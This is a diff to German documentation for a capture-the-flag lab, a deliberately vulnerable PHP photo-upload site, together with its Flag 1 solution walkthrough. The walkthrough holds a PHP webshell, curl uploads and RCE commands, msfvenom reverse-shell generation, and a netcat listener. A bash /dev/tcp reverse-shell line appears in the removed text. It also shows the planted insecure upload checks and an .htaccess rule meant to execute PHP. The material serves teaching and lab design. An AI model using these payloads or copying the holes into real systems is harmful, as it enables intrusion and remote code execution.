@@ -183,13 +183,13 @@ Die Webanwendung besteht aus folgenden Komponenten:
 | `upload.php` | Upload-Handler mit Schwachstelle |
 | `gallery.php` | Galerie mit hochgeladenen Bildern |
 | `thanks.php` | Bestätigungsseite nach erfolgreichem Upload |
-| `config.php` | Konfigurationsdatei mit Pfaden und Einstellungen |
+| `config.php` | Ablenkung |
 | `functions.php` | Hilfsfunktionen für Submission-Verwaltung |
 | `assets/style.css` | Stylesheet für modernes Design |
 | `robots.txt` | Robots-Datei mit Hinweisen auf gesperrte Verzeichnisse |
 | `.htaccess` | Apache-Konfiguration |
 | `uploads/` | Verzeichnis für hochgeladene Dateien |
-| `data/submissions.jsonl` | JSONL-Datei mit Submission-Daten |
+| `data/uploaded_files.txt` | TXT-Datei mit Submission-Logs |
 
 ### Implementierte Schwachstellen
 
@@ -197,7 +197,7 @@ Die Upload-Funktionalität in `upload.php` enthält mehrere absichtliche Sicherh
 
 #### 1. Dateiendungs-Check statt Inhaltsprüfung
 
-Die Applikation prüft **nur die Dateiendung** mit `pathinfo()` und akzeptiert Uploads, wenn die Endung zu den erlaubten Formaten gehört (`.jpg`, `.jpeg`, `.png`, `.gif`). Es erfolgt **keine Prüfung der tatsächlichen Dateiinhalte** (Magic Bytes) oder des MIME-Types.
+Die Applikation prüft **nur die letzte Dateiendung** mit `pathinfo()` und akzeptiert Uploads, wenn die Endung zu den erlaubten Formaten gehört (`.jpg`, `.jpeg`, `.png`, `.gif`). Es erfolgt **keine Prüfung der tatsächlichen Dateiinhalte** (Magic Bytes) oder des MIME-Types.
 
 ```php
 $fileExtension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
@@ -208,9 +208,25 @@ if (!in_array($fileExtension, $allowedExtensions)) {
 }
 ```
 
-Ein Angreifer kann eine Datei mit **Double-Extension** hochladen (z. B. `shell.php.jpg`). Die Applikation erkennt die Endung `.jpg` und akzeptiert den Upload, jedoch interpretiert Apache die Datei als PHP-Code, da `.php` in der Dateiendung enthalten ist.
+Ein Angreifer kann eine Datei mit **Double-Extension** hochladen (z. B. `shell.php.jpg`). Die Funktion `pathinfo()` extrahiert nur die **letzte** Endung und prüft, ob diese in der erlaubten Liste enthalten ist. Eine Datei namens `shell.php.jpg` hat als letzte Endung `.jpg`, wird also akzeptiert, obwohl `.php` im Dateinamen enthalten ist.
 
-#### 2. Uploads in ausführbares Web-Verzeichnis
+#### 2. Verwendung des Original-Dateinamens
+
+Die Applikation verwendet den **Original-Dateinamen** ohne ausreichende Bereinigung:
+
+```php
+$randomName = $originalName;
+$uploadPath = UPLOAD_DIR . $randomName;
+```
+
+Statt den Dateinamen vollständig zu randomisieren oder die Dateiendung komplett zu entfernen, wird der hochgeladene Dateiname direkt übernommen. Dies ermöglicht es einem Angreifer, gezielt Dateinamen zu wählen, die `.php` enthalten (z. B. `shell.php.jpg`), und diese Dateien später einfach zu finden, da der Name bekannt ist.
+
+In einer sicheren Implementierung würde:
+- Ein komplett neuer, zufälliger Dateiname generiert werden
+- Die originale Dateiendung vollständig entfernt werden
+- Oder die Datei mit einer sicheren Endung wie `.txt` oder `.dat` gespeichert werden
+
+#### 3. Uploads in ausführbares Web-Verzeichnis
 
 Die hochgeladenen Dateien werden direkt in das Verzeichnis `uploads/` innerhalb des DocumentRoot gespeichert. Dieses Verzeichnis ist vom Webserver aus direkt erreichbar und **PHP-Code wird standardmässig ausgeführt**.
 
@@ -220,9 +236,19 @@ In einer sicheren Konfiguration würde:
 - Eine strikte Content-Type-Prüfung erfolgen
 - Magic-Byte-Validierung implementiert sein
 
-#### 3. Fehlende .htaccess-Absicherung
+#### 4. Apache-Konfiguration ermöglicht PHP-Execution
 
-Die `.htaccess`-Datei enthält **keinen Schutz** gegen PHP-Ausführung im `uploads/`-Verzeichnis. In einer sicheren Konfiguration würde dort stehen:
+Die `.htaccess`-Datei enthält eine **kritische Fehlkonfiguration**, die es Apache erlaubt, Dateien mit `.php` im Namen als PHP auszuführen:
+
+```apache
+<FilesMatch ".+\.php">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+Diese Regel bewirkt, dass **jede Datei**, die `.php` **irgendwo** im Dateinamen enthält, vom Apache-Webserver als PHP-Code interpretiert und ausgeführt wird. Eine Datei mit dem Namen `shell.php.jpg` erfüllt diese Bedingung, da `.php` im Namen vorkommt, und wird daher trotz der `.jpg`-Endung als PHP-Skript behandelt.
+
+In einer sicheren Konfiguration würde stattdessen die PHP-Ausführung im Upload-Verzeichnis komplett deaktiviert:
 
 ```apache
 <Directory "/var/www/html/uploads">
@@ -230,7 +256,15 @@ Die `.htaccess`-Datei enthält **keinen Schutz** gegen PHP-Ausführung im `uploa
 </Directory>
 ```
 
-Dies würde die Ausführung von PHP-Code im Upload-Verzeichnis verhindern.
+Dies würde die Ausführung von PHP-Code im Upload-Verzeichnis vollständig verhindern, unabhängig vom Dateinamen.
+
+#### 5. Versteckte Gallery-Seite
+
+Die Seite `gallery.php` zeigt alle hochgeladenen Bilder an, ist jedoch **nicht in der Navigation** der Hauptseite verlinkt. Spieler:innen müssen diese Seite durch **Web-Enumeration** mit Tools wie `gobuster` oder `dirb` finden. Dies simuliert eine realistische Situation, in der nicht alle Endpunkte einer Webanwendung offensichtlich sind.
+
+Hinweise auf die Existenz der Gallery finden sich in:
+- `robots.txt` (ursprünglich, wurde später entfernt für erhöhten Schwierigkeitsgrad)
+- Direkte Enumeration mit Wordlists wie `/usr/share/wordlists/dirb/common.txt`
 
 ### Erstellung System-User und Flag
 
@@ -240,12 +274,13 @@ Für das Flag wurde ein dedizierter System-User namens **`webflag`** erstellt, d
 konfigurator@lutourismus:~$ sudo useradd -r -m -s /usr/sbin/nologin webflag
 ```
 
-Das Flag wurde in der Datei `/home/webflag/flag.txt` gespeichert und ist nur für den User `webflag` lesbar:
+Das Flag wurde in der Datei `/home/webflag/flag.txt` gespeichert und ist für alle Benutzer lesbar. **Wichtig:** Das Home-Verzeichnis `/home/webflag` muss für `www-data` zugänglich sein, damit die Flag nach erfolgreicher RCE gelesen werden kann:
 
 ```bash
 root@lutourismus:~# echo "flag{initial_access_luzernermoments_83723}" > /home/webflag/flag.txt
 root@lutourismus:~# chown webflag:webflag /home/webflag/flag.txt
 root@lutourismus:~# chmod 444 /home/webflag/flag.txt
+root@lutourismus:~# chmod 755 /home/webflag
 root@lutourismus:~# ls -l /home/webflag/
 total 4
 -r--r--r-- 1 webflag webflag 43 Oct 19 2025 flag.txt
@@ -253,16 +288,22 @@ total 4
 
 - **Flag:** `flag{initial_access_luzernermoments_83723}`
 - **Pfad:** `/home/webflag/flag.txt`
-- **Berechtigungen:** `444` (alle können lesen, niemand kann schreiben)
+- **Berechtigungen Flag:** `444` (alle können lesen, niemand kann schreiben)
+- **Berechtigungen Home:** `755` (Verzeichnis für www-data zugänglich)
 
 ### Hinweise für Spieler:innen
 
 Um die Spieler:innen in die richtige Richtung zu lenken, wurden folgende Hinweise implementiert:
 
-1. **robots.txt**: Enthält Einträge für `/uploads/` und `/backup_smb.sh`, was auf interessante Verzeichnisse und Dateien hinweist
-2. **Upload-Formular**: Zeigt deutlich, welche Dateitypen akzeptiert werden
-3. **Fehlermeldungen**: Geben klare Hinweise auf die Validierungslogik
-4. **Galerie**: Zeigt hochgeladene Dateien und deren Speicherort
+1. **robots.txt**: Enthält Einträge für `/uploads/`, `/data/`, `/config/`, `/old/` und `/backup_smb.sh`, was auf interessante Verzeichnisse und Dateien hinweist. Die Gallery (`gallery.php`) ist **nicht** in robots.txt aufgeführt und muss durch aktive Enumeration gefunden werden.
+
+2. **Upload-Formular**: Zeigt deutlich, welche Dateitypen akzeptiert werden (`JPG, JPEG, PNG, GIF`)
+
+3. **Fehlermeldungen**: Geben klare Hinweise auf die Validierungslogik bei fehlerhaften Uploads
+
+4. **Galerie (versteckt)**: Die Seite `gallery.php` ist nicht in der Navigation verlinkt und muss durch Web-Enumeration mit Tools wie `gobuster` oder `dirb` gefunden werden
+
+5. **Decoy-Verzeichnisse**: `/old/` (Under Construction) und `/config/` (403 Forbidden) dienen als realistische Ablenkung und simulieren eine echte Webanwendung mit verschiedenen Bereichen
 
 ## Flag 2: Operator Access - Crypto Challenge
 
@@ -762,48 +803,52 @@ Dieser Abschnitt beschriebt den vollständigen Lösungs Walkthrough des CTF in c
 
 ### Schritt 1: Web-Enumeration & Reconnaissance
 
-Als Erstes wird eine Web-Enumeration durchgeführt, um die Struktur der Webseite und mögliche interessante Pfade zu identifizieren. Hierfür können Tools wie **dirb**, **gobuster** oder **ffuf** verwendet werden.
+Als Erstes wird eine Web-Enumeration durchgeführt, um die Struktur der Webseite und mögliche interessante Pfade zu identifizieren. Hierfür können Tools wie **dirb**, **gobuster** oder **feroxbuster** verwendet werden.
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ dirb http://10.0.2.10
+└─$ gobuster dir -u http://10.0.2.10/ -w /usr/share/wordlists/dirb/common.txt -x php -t 50
 
------------------
-DIRB v2.22    
-By The Dark Raver
------------------
-
-START_TIME: Sat Oct 19 14:23:45 2025
-URL_BASE: http://10.0.2.10/
-WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-
------------------
-
-GENERATED WORDS: 4612
-
----- Scanning URL: http://10.0.2.10/ ----
-+ http://10.0.2.10/.htaccess (CODE:403|SIZE:275)
-==> DIRECTORY: http://10.0.2.10/assets/
-+ http://10.0.2.10/config.php (CODE:200|SIZE:0)
-==> DIRECTORY: http://10.0.2.10/data/
-+ http://10.0.2.10/gallery.php (CODE:200|SIZE:1234)
-+ http://10.0.2.10/index.php (CODE:200|SIZE:3456)
-+ http://10.0.2.10/robots.txt (CODE:200|SIZE:345)
-+ http://10.0.2.10/thanks.php (CODE:200|SIZE:2134)
-+ http://10.0.2.10/upload.php (CODE:302|SIZE:0)
-==> DIRECTORY: http://10.0.2.10/uploads/
-
------------------
-END_TIME: Sat Oct 19 14:25:12 2025
-DOWNLOADED: 4612 - FOUND: 7
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.0.2.10/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Extensions:              php
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 275]
+/assets               (Status: 301) [Size: 311] [--> http://10.0.2.10/assets/]
+/config               (Status: 301) [Size: 311] [--> http://10.0.2.10/config/]
+/config.php           (Status: 200) [Size: 0]
+/data                 (Status: 301) [Size: 309] [--> http://10.0.2.10/data/]
+/gallery.php          (Status: 200) [Size: 4521]
+/index.php            (Status: 200) [Size: 3782]
+/old                  (Status: 301) [Size: 308] [--> http://10.0.2.10/old/]
+/robots.txt           (Status: 200) [Size: 287]
+/thanks.php           (Status: 200) [Size: 2134]
+/upload.php           (Status: 302) [Size: 0] [--> http://10.0.2.10/thanks.php]
+/uploads              (Status: 301) [Size: 312] [--> http://10.0.2.10/uploads/]
+===============================================================
+Finished
+===============================================================
 ```
 
 Die Enumeration zeigt interessante Dateien und Verzeichnisse:
 - `/robots.txt` - Könnte Hinweise enthalten
+- `/gallery.php` - **Galerie-Seite (nicht in Navigation verlinkt!)**
 - `/uploads/` - Verzeichnis für hochgeladene Dateien
 - `/upload.php` - Upload-Handler
-- `/gallery.php` - Galerie
-- `/data/` - Daten-Verzeichnis
+- `/data/` - Daten-Verzeichnis (geschützt)
+- `/config/` - Konfigurationsverzeichnis (decoy)
+- `/old/` - Altes Verzeichnis (decoy)
 
 ### Schritt 2: Analyse von robots.txt
 
@@ -819,175 +864,253 @@ Die `robots.txt`-Datei wird untersucht, um zu sehen, welche Bereiche für Crawle
 User-agent: *
 Disallow: /uploads/
 Disallow: /data/
+Disallow: /config/
+Disallow: /old/
 Disallow: /backup_smb.sh
 Allow: /
 ```
 
 **Erkenntnisse:**
-- `/uploads/` ist für Crawler gesperrt (interessant!)
-- `/backup_smb.sh` wird erwähnt (für Flag 2 relevant)
-- `/data/` enthält vermutlich sensible Informationen
+- `/uploads/` ist für Crawler gesperrt (Upload-Verzeichnis)
+- `/data/` enthält vermutlich sensible Informationen (durch `.htaccess` geschützt)
+- `/config/` und `/old/` sind Decoy-Verzeichnisse
+- `/backup_smb.sh` wird erwähnt (Hinweis für Flag 2)
+- **Wichtig:** `gallery.php` ist **nicht** in robots.txt aufgeführt, wurde aber durch gobuster gefunden
 
-### Schritt 3: Analyse der Upload-Funktionalität
+### Schritt 3: Untersuchung der versteckten Gallery
 
-Auf der Hauptseite (`index.php`) befindet sich ein Upload-Formular für die #LuzernerMoments Kampagne. Das Formular zeigt, dass folgende Dateitypen akzeptiert werden:
-- JPG, JPEG, PNG, GIF
+Die durch gobuster gefundene Seite `/gallery.php` wird untersucht, obwohl sie nicht in der Navigation der Hauptseite verlinkt ist:
 
-Zunächst wird ein normaler Upload mit einem echten Bild getestet:
+```bash
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.0.2.10/gallery.php
+```
+
+Die Gallery-Seite zeigt hochgeladene Bilder und enthält ebenfalls ein Upload-Formular. Das Formular zeigt, dass folgende Dateitypen akzeptiert werden:
+- **JPG, JPEG, PNG, GIF**
+
+### Schritt 4: Test der Upload-Funktionalität
+
+Zunächst wird ein normaler Upload mit einem echten Bild getestet, um die Funktionalität zu verstehen:
 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl -X POST http://10.0.2.10/upload.php \
   -F "name=Test User" \
   -F "email=test@example.com" \
-  -F "description=Test Moment" \
-  -F "photo=@test_image.jpg"
+  -F "description=Beautiful moment from Luzern" \
+  -F "photo=@luzern_test.jpg"
 
-# Redirect zu: http://10.0.2.10/thanks.php?photo=photo_abc123def456.jpg
+# Redirect zu: http://10.0.2.10/thanks.php?photo=luzern_test.jpg
 ```
 
-Der Upload funktioniert und die Datei wird mit einem zufälligen Namen im `/uploads/`-Verzeichnis gespeichert.
+**Wichtige Erkenntnis:** Der Upload funktioniert und die Datei wird unter dem **Original-Dateinamen** im `/uploads/`-Verzeichnis gespeichert (keine Randomisierung!). Dies bedeutet, dass hochgeladene Dateien später leicht zu finden sind, da der Dateiname bekannt ist.
 
-### Schritt 4: Identifizierung der Schwachstelle
+### Schritt 5: Identifizierung der Schwachstelle
 
-Als Nächstes wird getestet, ob die Validierung umgangen werden kann. Es wird versucht, eine PHP-Datei mit **Double-Extension** hochzuladen:
+Als Nächstes wird getestet, ob die Validierung umgangen werden kann. Es wird versucht, eine PHP-Datei mit **Double-Extension** hochzuladen.
 
 **Erstelle eine einfache PHP-Webshell:**
 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ cat > shell.php.jpg << 'EOF'
-<?php
-system($_GET['cmd']);
-?>
+<?php system($_GET['cmd']); ?>
 EOF
 ```
 
+Die Datei hat den Namen `shell.php.jpg`:
+- Die Endung ist `.jpg` (wird von der Validierung akzeptiert)
+- Der Dateiname enthält `.php` (könnte von Apache als PHP interpretiert werden)
+
 **Upload der Webshell:**
+
+Es gibt zwei Möglichkeiten, die Datei hochzuladen:
+
+**Option 1: Browser-Upload**
+1. Besuche `http://10.0.2.10/gallery.php`
+2. Wähle die Datei `shell.php.jpg` aus
+3. Fülle die Formularfelder aus
+4. Klicke auf "Moment teilen"
+
+**Option 2: Upload via curl**
 
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ curl -X POST http://10.0.2.10/upload.php \
-  -F "name=Hacker" \
-  -F "email=hacker@evil.com" \
-  -F "description=Beautiful moment" \
+  -F "name=Tourist" \
+  -F "email=tourist@example.com" \
+  -F "description=Beautiful sunset" \
   -F "photo=@shell.php.jpg"
 
-# Redirect zu: http://10.0.2.10/thanks.php?photo=photo_1a2b3c4d5e6f7890.jpg
+# Redirect zu: http://10.0.2.10/thanks.php?photo=shell.php.jpg
 ```
 
-Der Upload wird akzeptiert! Die Applikation prüft nur die Endung `.jpg` und übersieht, dass `.php` in der Dateiendung enthalten ist.
+Der Upload wird akzeptiert! Die Applikation prüft nur die letzte Endung `.jpg` mit `pathinfo()` und übersieht, dass `.php` in der Dateiendung enthalten ist. Die Datei wird unter ihrem **Original-Namen** gespeichert: `/uploads/shell.php.jpg`
 
-### Schritt 5: Remote Code Execution (RCE)
+### Schritt 6: Remote Code Execution (RCE)
 
-Die hochgeladene Datei kann nun direkt aufgerufen werden. Da Apache die Datei als PHP interpretiert, wird der Code ausgeführt:
+Die hochgeladene Datei kann nun direkt aufgerufen werden. Da der Dateiname bekannt ist (`shell.php.jpg`), muss nicht nach dem Dateinamen gesucht werden. Apache interpretiert die Datei als PHP, weil die `.htaccess`-Konfiguration alle Dateien mit `.php` im Namen als PHP ausführt:
 
 ```bash
 ┌──(kali㉿kali)-[~]
-└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=id"
+└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=id"
 
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-**Erfolg!** Remote Code Execution wurde erreicht. Der Code wird als User `www-data` ausgeführt.
+**Erfolg!** Remote Code Execution wurde erreicht. Der PHP-Code wird als User `www-data` ausgeführt.
 
-### Schritt 6: System-Enumeration
+**Technischer Hintergrund:** Die `.htaccess`-Datei enthält folgende Regel:
+
+```apache
+<FilesMatch ".+\.php">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+Diese Regel matched auf **alle Dateien**, die `.php` irgendwo im Dateinamen haben. Die Datei `shell.php.jpg` enthält `.php` und wird daher von Apache als PHP-Code interpretiert und ausgeführt.
+
+### Schritt 7: System-Enumeration
 
 Mit der RCE können nun verschiedene Befehle ausgeführt werden, um das System zu erkunden:
 
 ```bash
-# Liste das aktuelle Verzeichnis
+# Prüfe aktuellen User
 ┌──(kali㉿kali)-[~]
-└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/var/www/html"
+└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=whoami"
 
-total 48
-drwxr-xr-x 5 www-data www-data 4096 Oct 19 14:00 .
-drwxr-xr-x 3 root     root     4096 Oct 19 12:00 ..
--rw-r--r-- 1 www-data www-data  743 Oct 19 13:00 .htaccess
-drwxr-xr-x 2 www-data www-data 4096 Oct 19 13:00 assets
--rw-r--r-- 1 www-data www-data  412 Oct 19 13:00 config.php
-drwxr-xr-x 2 www-data www-data 4096 Oct 19 14:15 data
--rw-r--r-- 1 www-data www-data  987 Oct 19 13:00 functions.php
--rw-r--r-- 1 www-data www-data 3542 Oct 19 13:00 gallery.php
--rw-r--r-- 1 www-data www-data 4321 Oct 19 13:00 index.php
--rw-r--r-- 1 www-data www-data  234 Oct 19 13:00 robots.txt
--rw-r--r-- 1 www-data www-data 2567 Oct 19 13:00 thanks.php
--rw-r--r-- 1 www-data www-data 1876 Oct 19 13:00 upload.php
-drwxr-xr-x 2 www-data www-data 4096 Oct 19 14:23 uploads
+www-data
+
+# Liste das Web-Verzeichnis
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=ls%20-la%20/var/www/html"
+
+total 56
+drwxr-xr-x 7 www-data www-data 4096 Oct 22 18:00 .
+drwxr-xr-x 3 root     root     4096 Oct 22 17:00 ..
+-rw-r--r-- 1 www-data www-data 1247 Oct 22 17:51 .htaccess
+drwxr-xr-x 2 www-data www-data 4096 Oct 22 17:51 assets
+drwxr-xr-x 2 www-data www-data 4096 Oct 22 18:00 config
+-rw-r--r-- 1 www-data www-data  485 Oct 22 17:51 config.php
+drwxr-xr-x 2 www-data www-data 4096 Oct 22 17:51 data
+-rw-r--r-- 1 www-data www-data 1842 Oct 22 18:21 functions.php
+-rw-r--r-- 1 www-data www-data 4231 Oct 22 17:51 gallery.php
+-rw-r--r-- 1 www-data www-data 2847 Oct 22 18:19 index.php
+drwxr-xr-x 2 www-data www-data 4096 Oct 22 18:00 old
+-rw-r--r-- 1 www-data www-data  345 Oct 22 18:07 robots.txt
+-rw-r--r-- 1 www-data www-data 2431 Oct 22 17:51 thanks.php
+-rw-r--r-- 1 www-data www-data 1987 Oct 22 18:42 upload.php
+drwxr-xr-x 2 www-data www-data 4096 Oct 22 18:48 uploads
+
+# Prüfe Upload-Log
+┌──(kali㉿kali)-[~]
+└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=cat%20/var/www/html/data/uploaded_files.txt"
+
+[2025-10-22 18:45:12] Uploaded: luzern_test.jpg by Test User (test@example.com)
+[2025-10-22 18:46:34] Uploaded: shell.php.jpg by Tourist (tourist@example.com)
 
 # Prüfe /home Verzeichnis
 ┌──(kali㉿kali)-[~]
-└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/home"
+└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=ls%20-la%20/home"
 
 total 16
-drwxr-xr-x  4 root    root    4096 Oct 19 12:30 .
-drwxr-xr-x 19 root    root    4096 Oct 19 12:00 ..
-drwxr-xr-x  2 operator internalIT 4096 Oct 16 14:36 operator
-drwxr-xr-x  2 webflag webflag 4096 Oct 19 13:15 webflag
+drwxr-xr-x  4 root     root     4096 Oct 22 17:30 .
+drwxr-xr-x 19 root     root     4096 Oct 22 17:00 ..
+drwxr-x---  2 operator internalIT 4096 Oct 16 14:36 operator
+drwxr-xr-x  2 webflag  webflag  4096 Oct 22 17:35 webflag
 ```
 
-Interessant! Es gibt zwei User-Verzeichnisse: `operator` und `webflag`.
+**Erkenntnisse:**
+- Es gibt zwei User-Verzeichnisse: `operator` und `webflag`
+- Das Verzeichnis `/home/webflag` ist für `www-data` zugänglich (Berechtigungen: `755`)
+- Das Upload-Log in `/var/www/html/data/uploaded_files.txt` zeigt alle hochgeladenen Dateien
 
-### Schritt 7: Flag finden
+### Schritt 8: Flag-Extraktion
+
+Die Flag befindet sich in `/home/webflag/flag.txt`. Da das Verzeichnis mit Berechtigungen `755` konfiguriert ist, kann `www-data` darauf zugreifen:
 
 ```bash
 # Liste Inhalt von /home/webflag
 ┌──(kali㉿kali)-[~]
-└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=ls%20-la%20/home/webflag"
+└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=ls%20-la%20/home/webflag"
 
 total 12
-drwxr-xr-x 2 webflag webflag 4096 Oct 19 13:15 .
-drwxr-xr-x 4 root    root    4096 Oct 19 12:30 ..
--r--r--r-- 1 webflag webflag   43 Oct 19 13:15 flag.txt
+drwxr-xr-x 2 webflag webflag 4096 Oct 22 17:35 .
+drwxr-xr-x 4 root    root    4096 Oct 22 17:30 ..
+-r--r--r-- 1 webflag webflag   43 Oct 22 17:35 flag.txt
 
 # Lese die Flag
 ┌──(kali㉿kali)-[~]
-└─$ curl "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg?cmd=cat%20/home/webflag/flag.txt"
+└─$ curl "http://10.0.2.10/uploads/shell.php.jpg?cmd=cat%20/home/webflag/flag.txt"
 
 flag{initial_access_luzernermoments_83723}
 ```
 
 **Erfolg!** Die Flag ist für alle lesbar und kann mit `www-data` Rechten ausgelesen werden.
 
-### Schritt 8: Interaktive Reverse Shell
+**Flag 1 gefunden:** `flag{initial_access_luzernermoments_83723}`
 
-Um komfortabler zu arbeiten, wird eine Reverse Shell eingerichtet:
+### Schritt 9: Alternative - Reverse Shell mit msfvenom (Optional)
+
+Für eine vollwertige Reverse Shell kann **msfvenom** aus dem Metasploit Framework verwendet werden:
+
+**Payload-Generierung:**
 
 ```bash
-# Auf dem Angreifer-System (Kali):
 ┌──(kali㉿kali)-[~]
-└─$ nc -lvnp 4444
+└─$ msfvenom -p php/reverse_php LHOST=10.0.2.5 LPORT=4444 -f raw > reverse.php
 
-# Reverse Shell triggern:
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 2679 bytes
+
 ┌──(kali㉿kali)-[~]
-└─$ curl -G "http://10.0.2.10/uploads/photo_1a2b3c4d5e6f7890.jpg" \
-  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.0.2.5/4444 0>&1'"
+└─$ mv reverse.php reverse.php.jpg
 ```
 
-Nach erfolgreicher Verbindung:
+**Listener aufsetzen:**
 
 ```bash
+# Terminal 1: Starte Netcat Listener
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+```
+
+**Upload und Trigger:**
+
+```bash
+# Terminal 2: Upload msfvenom Payload
+┌──(kali㉿kali)-[~]
+└─$ curl -X POST http://10.0.2.10/upload.php \
+  -F "name=Attacker" \
+  -F "email=attacker@evil.com" \
+  -F "description=Pwned" \
+  -F "photo=@reverse.php.jpg"
+
+# Trigger Payload (Dateiname ist bekannt!)
+┌──(kali㉿kali)-[~]
+└─$ curl http://10.0.2.10/uploads/reverse.php.jpg
+```
+
+**Reverse Shell empfangen:**
+
+```bash
+# Terminal 1: Netcat Listener
+connect to [10.0.2.5] from (UNKNOWN) [10.0.2.10] 54321
+
+# Upgrade Shell (optional)
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
 www-data@lutourismus:/var/www/html/uploads$ whoami
 www-data
 
 www-data@lutourismus:/var/www/html/uploads$ cd /home/webflag
-www-data@lutourismus:/home/webflag$ ls -la
-total 12
-drwxr-xr-x 2 webflag webflag 4096 Oct 19 13:15 .
-drwxr-xr-x 4 root    root    4096 Oct 19 12:30 ..
--r--r--r-- 1 webflag webflag   43 Oct 19 13:15 flag.txt
-```
-
-### Schritt 9: Flag extrahieren
-
-Die Flag-Datei ist für alle lesbar, somit kann sie direkt mit `www-data` Rechten gelesen werden:
-
-```bash
 www-data@lutourismus:/home/webflag$ cat flag.txt
 flag{initial_access_luzernermoments_83723}
 ```
-
-**Flag 1 gefunden:** `flag{initial_access_luzernermoments_83723}`
 
 ### Schritt 10: Übergang zu Flag 2
 
@@ -1012,30 +1135,46 @@ Das Skript `backup_smb.sh` (aus `robots.txt`) enthält Base64-kodierte Zugangsda
 
 ### Zusammenfassung Flag 1
 
-**Schwachstelle:** Unsichere Datei-Upload-Funktionalität mit:
-- Nur Dateiendungs-Check (keine Magic-Byte-Prüfung)
-- Keine MIME-Type-Validierung
-- Uploads in ausführbares Web-Verzeichnis
-- PHP-Execution im Upload-Verzeichnis nicht deaktiviert
+**Schwachstellen-Kette:**
 
-**Exploitation:**
-1. Erstelle PHP-Webshell mit Double-Extension (`.php.jpg`)
-2. Upload über das Formular
-3. Direkter Aufruf der hochgeladenen Datei führt zu RCE
-4. System-Enumeration und Flag-Extraktion
+1. **Versteckte Gallery:** `gallery.php` nicht in Navigation → Erfordert Web-Enumeration
+2. **Schwache Upload-Validierung:** Nur letzte Dateiendung wird geprüft (`pathinfo()`)
+3. **Keine Filename-Sanitization:** Original-Dateinamen werden verwendet (keine Randomisierung)
+4. **Apache FilesMatch:** `.htaccess` führt alle Dateien mit `.php` im Namen als PHP aus
+5. **Fehlende Upload-Absicherung:** PHP-Execution im `/uploads/` Verzeichnis nicht deaktiviert
+6. **Zugängliches Flag:** `/home/webflag/` mit Berechtigungen `755` erlaubt www-data Zugriff
 
-**Tools:**
-- dirb/gobuster (Web-Enumeration)
-- curl (HTTP-Requests)
-- netcat (Reverse Shell)
-- Standard Linux-Tools (ls, cat, find)
+**Exploitation-Flow:**
 
-**Gelernte Konzepte:**
-- Web-Reconnaissance
-- Datei-Upload-Schwachstellen
-- Double-Extension-Bypass
-- Remote Code Execution
-- Initial Access Techniken
+1. **Enumeration:** gobuster/dirb findet versteckte `gallery.php`
+2. **Reconnaissance:** robots.txt zeigt interessante Pfade
+3. **Vulnerability Testing:** Upload mit normalem Bild testen
+4. **Weaponization:** 
+   - **Option A:** Einfache Webshell: `echo '<?php system($_GET[cmd]); ?>' > shell.php.jpg`
+   - **Option B:** msfvenom: `msfvenom -p php/reverse_php LHOST=<IP> LPORT=4444 -f raw > reverse.php`
+5. **Delivery:** Upload `shell.php.jpg` oder `reverse.php.jpg` (Browser oder curl)
+6. **Exploitation:** Zugriff auf `/uploads/shell.php.jpg` (Dateiname bekannt!)
+7. **Actions on Objective:** RCE als www-data → Flag-Extraktion
+
+**Verwendete Tools:**
+
+- **gobuster/dirb/feroxbuster:** Web-Enumeration und Discovery
+- **curl:** HTTP-Requests und Upload-Testing
+- **msfvenom:** Payload-Generierung (Metasploit Framework)
+- **netcat (nc):** Reverse Shell Listener
+- **Standard Linux-Tools:** ls, cat, whoami, id
+
+**Geförderte Fähigkeiten:**
+
+- Web-Reconnaissance und Enumeration
+- Identifizierung versteckter Endpunkte
+- Analyse von Datei-Upload-Mechanismen
+- Double-Extension-Bypass-Techniken
+- Apache .htaccess Konfigurationsschwachstellen
+- Payload-Generierung mit msfvenom
+- Remote Code Execution (RCE)
+- Linux-Filesystem-Navigation
+- Initial Access und Post-Exploitation
 
 Flag 2
 
